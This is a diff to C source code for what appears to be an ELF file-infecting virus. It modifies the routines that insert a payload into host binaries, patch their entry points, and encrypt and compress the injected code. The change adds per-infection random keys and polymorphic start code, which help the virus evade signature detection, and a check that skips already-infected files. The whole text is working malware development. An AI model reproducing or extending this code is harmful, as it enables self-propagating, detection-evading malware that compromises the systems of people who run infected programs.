@@ -3,6 +3,13 @@
 //char KEY[16];
 #define DATA 0x02
 
+void randomize_key(){
+	((uint32_t*)key)[0] = ft_rand();	
+	((uint32_t*)key)[1] = ft_rand();	
+	((uint32_t*)key)[2] = ft_rand();	
+	((uint32_t*)key)[3] = ft_rand();	
+}
+
 int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 {
 	Elf64_Ehdr *h = (void*)s;
@@ -68,15 +75,13 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	*n = (*n) + add;
 }
 
-void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, bool compressed, struct s_infect_params params){
+void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn, struct s_infect_params params){
 	//add a few information about himself
 	debug_ext("data_off>>", params.data_off, "\n");
 	uint64_t *p = ((uint64_t *)(char*)(b + params.data_off));
 	p[0] = max(old_entry,entry) - min(old_entry,entry);
 	//struct s_opt *p_opt = (struct s_opt*)(((char *)b+DATA+8));
 	*(struct s_opt *)(p + 1) = opt;
-	debug("compresse", p + 2, "\n");
-	p[2] = compressed;
 	//p[3] = ((uint64_t*)key)[0];
 	//p[4] = ((uint64_t*)key)[1];
 
@@ -120,7 +125,6 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	char *olds2 = *s;
 	_insert(s, n, pos-1, p.b, p.bn);
 	//encryption
-	bool compressed;
 
 	void *route = (void*)(*s + pos + p.decrypt_routine_off);
 	//void *xx = ft_malloc(1024);
@@ -134,23 +138,27 @@ static int _infect(char **s, size_t *n, struct s_infect_params p, struct s_opt o
 	ph = (*(void**)s) + h->e_phoff;
 	//TODO: check not already inf
 	//ph[x].p_memsz += changed;
-	poly_new_start((*s) + pos);//TODO
-	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, compressed, p);
+	poly_new_start((*s) + pos, p.infect_push_off, p.infect_pop_off);
+	randomize_key();
+	update((*s) + pos, p.bn, old_entry, h->e_entry, opt, *s, *n, p);
 
-	//---------- z2 (encryption without compression) -------------
-	compressed = FALSE;
-	((unsigned char*)key)[0] ^= 0b01110010;
-	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &compressed, p.encrypt_routine) == -1)
-		return FALSE;
-	((unsigned char*)key)[0] ^= 0b01110010;
 	//---------- z3 (encryption with compression) ----------------
-	compressed = TRUE;
+	bool compressed = TRUE;
 	int64_t changed = encrypt(((*s) + pos + p.crypt_off), p.crypt_len, (uint32_t*)key, &compressed, p.encrypt_routine);
 	if (changed == -1)
 		return FALSE;
+	//update iscompressed in data
+	((uint64_t *)(char*)((*s) + pos + p.data_off))[2] = ((uint64_t)compressed);
+	//---------- z2 (encryption without compression) -------------
+	bool nocompress = FALSE;
+	((unsigned char*)key)[0] ^= 0b01110010;
+	if (encrypt(((*s) + pos + p.cmpr_off), p.cmpr_len, (uint32_t*)key, &nocompress, p.encrypt_routine) == -1)
+		return FALSE;
+	((unsigned char*)key)[0] ^= 0b01110010;
+
 	//int get_sig(char *s, size_t n, size_t virus_len, char *sig)
 	get_sig(*s, *n, p.bn, ((uint64_t *)(char*)((*s) + pos + p.dataearly_off)) + 2);
-
+	
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
@@ -171,7 +179,7 @@ int check_already_packed(char *s, size_t n, size_t virus_len, size_t dataearly_o
 		return TRUE;
 	char *p = (char*)(((uint64_t *)(s + entry + dataearly_off)) + 2);
 	//size_t *p = ((size_t *)(char*)(s + entry + DATA));
-	debug("cmp ", sig, " ", p, "\n");
+	//debug("cmp ", sig, " ", p, "\n");
 	if (sncmp(p, sig, sig_len) == 0)
 		return fail("already packed");
 	return TRUE;
